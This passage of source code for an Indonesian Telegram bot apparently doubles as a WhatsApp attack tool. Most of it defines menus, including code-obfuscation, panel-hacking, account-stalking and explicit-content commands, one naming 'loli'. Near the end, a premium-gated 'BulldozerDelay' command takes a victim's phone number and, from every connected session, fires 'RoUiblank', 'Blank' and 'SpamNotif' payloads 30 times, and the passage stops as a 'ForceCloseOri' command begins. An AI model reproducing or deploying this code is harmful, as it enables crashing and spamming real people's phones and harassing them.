┃⚝┌ /regis
┃⚝├ /profile2
┃⚝├ /buy
┃⚝├ /sell
┃⚝├ /slot
┃⚝├ /kerja
┃⚝├ /mancing
┃⚝├ /kolam
┃⚝├ /berburu
┃⚝├ /kandang
┃⚝├ /merampok
┃⚝├ /berdagang
┃⚝├ /buah
┃⚝├ /berkebon
┃⚝├ /craft
┃⚝├ /addbank
┃⚝├ /bankcek
┃⚝├ /tarik
┃⚝├ /atmup
┃⚝└ /bonus
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "encmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴇɴᴄ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🔐 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /enc [LEVEL]         - STANDARD
┃⚝├ /enceval [LEVEL]     - EVALUATE
┃⚝├ /encchina            - MANDARIN
┃⚝├ /encarab             - ARABIC
┃⚝├ /encjapan            - JAPANESE
┃⚝├ /encinvis            - INVISIBLE
┃⚝├ /encjapxab           - JAPAN × ARAB
┃⚝├ /encx                - BASE64
┃⚝├ /encnebula           - HARD
┃⚝├ /encexpired          - EXPIRED DAT
┃⚝├ /encnova             - NOVA
┃⚝├ /encsiu              - SIU + CALCRICK
┃⚝├ /customenc [NAME]    - DESIGN
┃⚝├ /encmax [INTENSITY]  - MAX INTENSITY
┃⚝├ /encstealth          - STEALTH MODE
┃⚝├ /encstrong           - POWER
┃⚝├ /encultra            - ULTRA
┃⚝├ /deobfuscate         - DECRYPT
┃⚝├ /encbig [MB]         - MEGABYTE
┃⚝├ /encnew              - ADVANCED
┃⚝├ /enchtml             - HTML ONLY
┃⚝├ /decrypt             - DECRYPTION
┃⚝├ /encquantum          - QUANTUM
┃⚝└ /enclocked           - HARD LOCK
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "animeanime") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ᴀɴɪᴍᴇ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🍥 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /husbu
┃⚝├ /waifu
┃⚝├ /shota
┃⚝├ /miku
┃⚝├ /neko
┃⚝└ /loli
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "seterus1" },
                ],
        ];
}
else if (data === "animemenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /ʀᴀɴᴅᴏᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎲 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /aesthetic
┃⚝├ /blackpink
┃⚝├ /boneka
┃⚝├ /cat
┃⚝├ /cosplay
┃⚝├ /justina
┃⚝├ /kayes
┃⚝├ /notnot
┃⚝├ /ppcouple
┃⚝├ /profile
┃⚝├ /wallhp
┃⚝├ /wallml
┃⚝└ /wibucek
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}
else if (data === "supportmenu") {
        newCaption =
                `<blockquote><strong>┏━━━━━『 /sᴜᴘᴘᴏʀᴛ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧾 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /reqfitur
┃⚝└ /donate
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`;

        newButtons = [
                [
                        { text: "◁", callback_data: "lanjut" },
                ],
        ];
}


try {
        await ctx.editMessageCaption(newCaption, {
                parse_mode: "HTML",
                reply_markup: {
                        inline_keyboard: newButtons,
                },
        });
} catch (err) {
        console.log("❌ Gagal edit caption:", err.message);
}


await ctx.answerCbQuery();
});

async function sendMenuAudio(ctx, caption) {
  await ctx.sendChatAction('typing');
  await sleep(350);
  await ctx.sendChatAction('upload_audio');
  await sleep(350);

  return ctx.replyWithAudio(
    { source: 'music/music.mp3' },
    {
      caption,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: "〽️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴋᴀ – ᴍᴅ", url: "https://t.me/Rizzxtzy" }]
        ]
      }
    }
  );
}

const MENUS = {
  islam: `<blockquote><strong>┏━━━━━『 /ɪsʟᴀᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🏚 ᴛᴏᴛᴀʟ ᴄᴀᴛᴇɢᴏʀʏ : 𝟾
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /niatsholat
┃⚝├ /bacaansholat
┃⚝├ /doaharian
┃⚝├ /doatahlil
┃⚝├ /jadwalsholat
┃⚝├ /kisahnabi
┃⚝├ /asmaulhusna
┃⚝└ /ayatkursi
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  saweria: `<blockquote><strong>┏━━━━━『 /sᴀᴡᴇʀɪᴀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 💰 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /prem
┃⚝├ /listprem
┃⚝├ /unprem
┃⚝├ /rekaptransaksi
┃⚝├ /claimhadiah1
┃⚝├ /claimhadiah2
┃⚝├ /batalbeli
┃⚝├ /spin1
┃⚝├ /gachapeti
┃⚝└ /login
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  claim: `<blockquote><strong>┏━━━━━『 /ᴄʟᴀɪᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎁 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟻
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /claimbug      [200k Saldo]
┃⚝├ /claimdb       [250k Saldo]
┃⚝├ /claimcvps     [350k Saldo]
┃⚝├ /claimeternal  [950k Saldo]
┃⚝└ /claimmd       [200k Saldo]
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃ 💡 ᴄᴀᴛᴀᴛᴀɴ :
┃⚝┌ Setiap bermain +25.000 Saldo
┃⚝├ /claimmd ≠ Galaxy MD
┃⚝└ Script MD WhatsApp
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  games: `<blockquote><strong>┏━━━━━『 /ɢᴀᴍᴇs ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎮 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /tekateki
┃⚝├ /susunkata
┃⚝├ /siapaaku
┃⚝├ /family100
┃⚝├ /asahotak
┃⚝├ /tictactoe
┃⚝├ /ceksaldo
┃⚝├ /addsaldo
┃⚝├ /minsaldo
┃⚝└ /allsaldo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  tebak: `<blockquote><strong>┏━━━━━『 /ᴛᴇʙᴀᴋ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧩 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /tebaktebakan
┃⚝├ /tebakkata
┃⚝├ /tebakkabupaten
┃⚝├ /tebakgambar
┃⚝├ /ceksaldo
┃⚝└ /allsaldo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  catat: `<blockquote><strong>┏━━━━━『 /ᴄᴀᴛᴀᴛᴀɴ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 📝 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addpendapatan
┃⚝├ /delpendapatan
┃⚝├ /listpendapatan
┃⚝├ /totalpendapatan
┃⚝├ /resetpendapatan
┃⚝├ /addhutang
┃⚝├ /delhutang
┃⚝├ /listhutang
┃⚝├ /resethutang
┃⚝├ /adddp
┃⚝├ /deldp
┃⚝├ /listdp
┃⚝└ /resetdp
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  store: `<blockquote><strong>┏━━━━━『 /sᴛᴏʀᴇ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛒 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addrespon
┃⚝├ /delrespon
┃⚝├ /listrespon
┃⚝├ /proses
┃⚝├ /done
┃⚝├ /produk
┃⚝├ /payment
┃⚝├ /cek
┃⚝└ /sendtesti
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  jasher: `<blockquote><strong>┏━━━━━『 /ᴊᴀsʜᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧰 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /jasher
┃⚝├ /jasher2
┃⚝├ /listgroup
┃⚝├ /addgroupid
┃⚝├ /delgroupid
┃⚝└ /savegroup
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  bypass: `<blockquote><strong>┏━━━━━『 /ʙʏᴘᴀss ᴍᴇɴᴜ 』━━━━━━━┓
┃ 👋 ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ!
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ Kirim file .js untuk mulai diproses.
┃⚝└ Contoh: kirim file lalu ketik /bypass
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  install: `<blockquote><strong>┏━━━━━『 /ɪɴsᴛᴀʟʟ ᴍᴇɴᴜ 』━━━━━━━┓
┃ ⚙️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /startwings
┃⚝├ /hackbackpanel
┃⚝├ /installtema
┃⚝├ /installpanel
┃⚝├ /uninstalltema
┃⚝├ /uninstallpanel
┃⚝├ /installtemastellar
┃⚝├ /installtemaelysium
┃⚝├ /installdepend   [pasang sebelum nebula]
┃⚝├ /installtemanebula
┃⚝├ /installtemaenigma
┃⚝└ /installtemabilling
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  download: `<blockquote><strong>┏━━━━━『 /ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』━━━━━━━┓
┃ ⬇️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟺
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /capcutdl
┃⚝├ /facebook
┃⚝├ /gdrive
┃⚝├ /ig
┃⚝├ /mediafire
┃⚝├ /pin
┃⚝├ /terabox
┃⚝├ /tiktok
┃⚝├ /twitter
┃⚝├ /twitterimage
┃⚝├ /videydl
┃⚝├ /ytdl
┃⚝├ /play
┃⚝├ /playch
┃⚝├ /spotify
┃⚝├ /lyrics
┃⚝├ /ytmp3
┃⚝├ /ytmp4
┃⚝├ /lyricsearch
┃⚝└ /berita
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  tools: `<blockquote><strong>┏━━━━━『 /ᴛᴏᴏʟs ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛠️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟺𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /animbrat
┃⚝├ /brat
┃⚝├ /brat2
┃⚝├ /cekid
┃⚝├ /cloneweb
┃⚝├ /colorize
┃⚝├ /countryinfo
┃⚝├ /dewatermark
┃⚝├ /getcode
┃⚝├ /getcodezip
┃⚝├ /getid
┃⚝├ /getlink
┃⚝├ /getpp
┃⚝├ /hd
┃⚝├ /hijabkan
┃⚝├ /infogempa
┃⚝├ /info
┃⚝├ /iqc
┃⚝├ /lyrics
┃⚝├ /nulis
┃⚝├ /open
┃⚝├ /pakustad
┃⚝├ /pakustad2
┃⚝├ /ping
┃⚝├ /play
┃⚝├ /playch
┃⚝├ /qc
┃⚝├ /qr2text
┃⚝├ /readqr
┃⚝├ /removebg
┃⚝├ /spotify
┃⚝├ /ssweb
┃⚝├ /subdomain
┃⚝├ /text2qr
┃⚝├ /toimg
┃⚝├ /tojs
┃⚝├ /tocode
┃⚝├ /tosticker
┃⚝├ /tourl
┃⚝└ /translate
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  group: `<blockquote><strong>┏━━━━━『 /ɢʀᴏᴜᴘ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 👥 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /status
┃⚝├ /warn
┃⚝├ /bukajam
┃⚝├ /tutupjam
┃⚝├ /add
┃⚝├ /kick
┃⚝├ /promote
┃⚝├ /demote
┃⚝├ /mute
┃⚝├ /unmute
┃⚝├ /antilink
┃⚝├ /antimedia
┃⚝└ /setforwardchat
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  bot: `<blockquote><strong>┏━━━━━『 /ᴀɪ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🤖 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /gpt4o
┃⚝├ /deepseek
┃⚝├ /gemini
┃⚝├ /aiedit
┃⚝├ /fixcode
┃⚝├ /editcode
┃⚝├ /fixcodeerror   [error]
┃⚝├ /plugintelegraf
┃⚝└ /plugintelegram
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  stalk: `<blockquote><strong>┏━━━━━『 /sᴛᴀʟᴋ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🕵️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /githubstalk
┃⚝├ /instagramstalk
┃⚝├ /tiktokstalk
┃⚝├ /twitterstalk
┃⚝├ /pintereststalk
┃⚝├ /youtubestalk
┃⚝├ /danastalk
┃⚝├ /ovostalk
┃⚝└ /gopaystalk
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  search: `<blockquote><strong>┏━━━━━『 /sᴇᴀʀᴄʜ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🔍 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟾
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /ytsearch
┃⚝├ /ttsearch
┃⚝├ /animequote
┃⚝├ /bingimg
┃⚝├ /googleimg
┃⚝├ /pinterest
┃⚝├ /stiktok
┃⚝├ /syoutube
┃⚝└ /bstationsearch
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  panel: `<blockquote><strong>┏━━━━━『 /ᴘᴀɴᴇʟ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🖥️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /1gb   [user,idtele]
┃⚝├ /2gb   [user,idtele]
┃⚝├ /3gb   [user,idtele]
┃⚝├ /4gb   [user,idtele]
┃⚝├ /5gb   [user,idtele]
┃⚝├ /6gb   [user,idtele]
┃⚝├ /7gb   [user,idtele]
┃⚝├ /8gb   [user,idtele]
┃⚝├ /9gb   [user,idtele]
┃⚝├ /10gb  [user,idtele]
┃⚝├ /unli  [user,idtele]
┃⚝├ /listsrv
┃⚝├ /delsrv
┃⚝├ /listusr
┃⚝├ /delusr
┃⚝└ /listadmin
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  owner: `<blockquote><strong>┏━━━━━『 /ᴏᴡɴᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 👑 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /broadcast
┃⚝├ /upch
┃⚝├ /ban
┃⚝├ /unban
┃⚝├ /listban
┃⚝├ /listuser
┃⚝├ /listpengguna
┃⚝├ /listgroup
┃⚝├ /delaccess
┃⚝├ /addpremium [id] [hari]
┃⚝├ /delpremium [id]
┃⚝├ /listpremium
┃⚝├ /cekprem [id]
┃⚝├ /buatfunc
┃⚝├ /csessions
┃⚝├ /addcreds
┃⚝└ /delpremium
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  botmenu: `<blockquote><strong>┏━━━━━『 /ʙᴏᴛ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🤖 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟷
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /show
┃⚝├ /file
┃⚝├ /change [kode]
┃⚝├ /ganti [file]
┃⚝├ /restart
┃⚝├ /convertplugin
┃⚝├ /buatkanplugin
┃⚝├ /listplugin
┃⚝├ /addplugin
┃⚝├ /delplugin
┃⚝├ /backup
┃⚝└ /backup2
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  ownerpanel: `<blockquote><strong>┏━━━━━『 /ᴘᴀɴᴇʟ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🛡️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟻
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addowner [id]
┃⚝├ /delowner [id]
┃⚝├ /addprem [id]
┃⚝├ /delprem [id]
┃⚝└ /listadmin
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  developer: `<blockquote><strong>┏━━━━━『 /ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧑‍💻 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /addsender +62xx
┃⚝├ /listsender
┃⚝├ /userlist
┃⚝├ /subdomain
┃⚝├ /broadcast
┃⚝├ /addstock
┃⚝├ /delstock
┃⚝├ /addstockdo
┃⚝├ /delstockdo
┃⚝├ /getstock
┃⚝├ /getstockdo
┃⚝├ /addscript
┃⚝├ /delscript
┃⚝├ /getscript
┃⚝├ /ping
┃⚝└ /vpsinfo
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  web: `<blockquote><strong>┏━━━━━『 /ᴡᴇʙ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🃏 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟽
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /createweb
┃⚝├ /cwen
┃⚝├ /listweb
┃⚝├ /delweb
┃⚝├ /createnetlify
┃⚝├ /delnetlify
┃⚝└ /listnetlify
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  vps: `<blockquote><strong>┏━━━━━『 /ᴠᴘs ᴍᴇɴᴜ 』━━━━━━━┓
┃ ✨ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /cvps
┃⚝├ /cvps2
┃⚝├ /createvps
┃⚝├ /sisadroplet
┃⚝├ /deldroplet
┃⚝├ /listdroplet
┃⚝├ /rebuild
┃⚝├ /restartvps
┃⚝├ /startvps
┃⚝└ /stopvps
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  subdo: `<blockquote><strong>┏━━━━━『 /sᴜʙᴅᴏ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 💲 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟶
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /subdomain
┃⚝├ /createdomain
┃⚝├ /delsubdo
┃⚝├ /listdns
┃⚝├ /delallsubdo
┃⚝└ /res_list_dns_record
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  fun: `<blockquote><strong>┏━━━━━『 /ꜰᴜɴ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎭 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /asupan
┃⚝├ /paptt
┃⚝├ /paptt2
┃⚝├ /nsfwimg
┃⚝├ /xnxxvid
┃⚝├ /xnxxvideo
┃⚝├ /xnxxsearch
┃⚝├ /xnxxsearch2
┃⚝├ /nhentai [query] [page]
┃⚝├ /xvideos
┃⚝├ /xsearch
┃⚝├ /cecanindo
┃⚝├ /cecanjapan
┃⚝├ /cecankorea
┃⚝├ /cecanchina
┃⚝├ /cecanthailand
┃⚝├ /cecanvietnam
┃⚝├ /cekkhodam
┃⚝├ /cekkontol
┃⚝├ /bisakah
┃⚝├ /cosplay
┃⚝├ /cosplaytele
┃⚝└ /done
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  rpg: `<blockquote><strong>┏━━━━━『 /ʀᴘɢ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🗺️ 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟿
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /regis
┃⚝├ /profile2
┃⚝├ /buy
┃⚝├ /sell
┃⚝├ /slot
┃⚝├ /kerja
┃⚝├ /mancing
┃⚝├ /kolam
┃⚝├ /berburu
┃⚝├ /kandang
┃⚝├ /merampok
┃⚝├ /berdagang
┃⚝├ /buah
┃⚝├ /berkebon
┃⚝├ /craft
┃⚝├ /addbank
┃⚝├ /bankcek
┃⚝├ /tarik
┃⚝├ /atmup
┃⚝└ /bonus
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  enc: `<blockquote><strong>┏━━━━━『 /ᴇɴᴄ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🔐 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸𝟹
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /enc [LEVEL]         - STANDARD
┃⚝├ /enceval [LEVEL]     - EVALUATE
┃⚝├ /encchina            - MANDARIN
┃⚝├ /encarab             - ARABIC
┃⚝├ /encjapan            - JAPANESE
┃⚝├ /encinvis            - INVISIBLE
┃⚝├ /encjapxab           - JAPAN × ARAB
┃⚝├ /encx                - BASE64
┃⚝├ /encnebula           - HARD
┃⚝├ /encexpired          - EXPIRED DAT
┃⚝├ /encnova             - NOVA
┃⚝├ /encsiu              - SIU + CALCRICK
┃⚝├ /customenc [NAME]    - DESIGN
┃⚝├ /encmax [INTENSITY]  - MAX INTENSITY
┃⚝├ /encstealth          - STEALTH MODE
┃⚝├ /encstrong           - POWER
┃⚝├ /encultra            - ULTRA
┃⚝├ /deobfuscate         - DECRYPT
┃⚝├ /encbig [MB]         - MEGABYTE
┃⚝├ /encnew              - ADVANCED
┃⚝├ /enchtml             - HTML ONLY
┃⚝├ /decrypt             - DECRYPTION
┃⚝├ /encquantum          - QUANTUM
┃⚝└ /enclocked           - HARD LOCK
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  anime: `<blockquote><strong>┏━━━━━『 /ᴀɴɪᴍᴇ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🍥 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟼
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /husbu
┃⚝├ /waifu
┃⚝├ /shota
┃⚝├ /miku
┃⚝├ /neko
┃⚝└ /loli
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  random: `<blockquote><strong>┏━━━━━『 /ʀᴀɴᴅᴏᴍ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🎲 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟷𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /aesthetic
┃⚝├ /blackpink
┃⚝├ /boneka
┃⚝├ /cat
┃⚝├ /cosplay
┃⚝├ /justina
┃⚝├ /kayes
┃⚝├ /notnot
┃⚝├ /ppcouple
┃⚝├ /profile
┃⚝├ /wallhp
┃⚝├ /wallml
┃⚝└ /wibucek
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`,

  support: `<blockquote><strong>┏━━━━━『 /sᴜᴘᴘᴏʀᴛ ᴍᴇɴᴜ 』━━━━━━━┓
┃ 🧾 𝚃𝙾𝚃𝙰𝙻 𝙵𝙸𝚃𝚄𝚁 : 𝟸
┣━━━━━━━━━━━━━━━━━━━━━━━❖
┃⚝┌ /reqfitur
┃⚝└ /donate
┗━━━━━━━━━━━━━━━━━━━━━━━━❖</strong></blockquote>`
};

// satu handler buat banyak menu (dynamic)
function registerMenuCommand(bot, cmdName) {
  bot.command(cmdName, async (ctx) => {
    const text = (ctx.message?.text || '').trim();
    const args = text.split(/\s+/).slice(1);

    if (args[0]?.toLowerCase() === 'menu') {
      const caption = MENUS[cmdName];
      if (!caption) {
        return ctx.reply(`Menu "${cmdName}" belum ada.`, {
          reply_to_message_id: ctx.message.message_id
        });
      }
      return sendMenuAudio(ctx, caption);
    }

    return ctx.reply(`Gunakan perintah:\n/${cmdName} menu`, {
      reply_to_message_id: ctx.message.message_id
    });
  });
}

// daftar command yang mau dipakai (auto dari MENUS biar gak lupa)
Object.keys(MENUS).forEach((name) => registerMenuCommand(bot, name));

bot.on("sticker", (ctx) => {
  console.log("STICKER FILE_ID =", ctx.message.sticker.file_id);
  return ctx.reply(`file_id:\n<code>${ctx.message.sticker.file_id}</code>`, { parse_mode: "HTML" });
});
// === Shortcut commands ===
bot.command('hyxvuhihb', async (ctx) => {
  try {
    await sendMainMenu(ctx);
  } catch (e) {
    console.error('Error /menu:', e);
  }
});
bot.hears(['.vuydvjub', 'ghhhhhjjfdx'], async (ctx) => {
  // allow ".menu" and plain "menu" too
  try {
    await sendMainMenu(ctx);
  } catch (e) {
    console.error('Error hears menu:', e);
  }
});

bot.command('BulldozerDelay', async (ctx) => {
const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /kirim 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/bprwxm.jpg",
    filename: "ᔫ 𖣂 𝐓͢𝐇͡𝐄͢'''𝐖͡𝐎͢𝐋͡𝐅 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🐉 𝐙𝐞𝐱 ☇ Kirim˚Paket 𖣂\`\`\`
alvo: ${target}
menu : Panel
status: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🦋 por que mano
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤", callback_data: "PaketPilihan" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 30; i++) {
          await RoUiblank(sock, target, Ptcp = true);
          await Blank(sock, target, ptcp = true);
          await SpamNotif(sock, target, Ptcp = true); 
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim paket:", err);
  }
});
bot.command('ForceCloseOri', async (ctx) => {
const senderId = String(ctx.from.id);

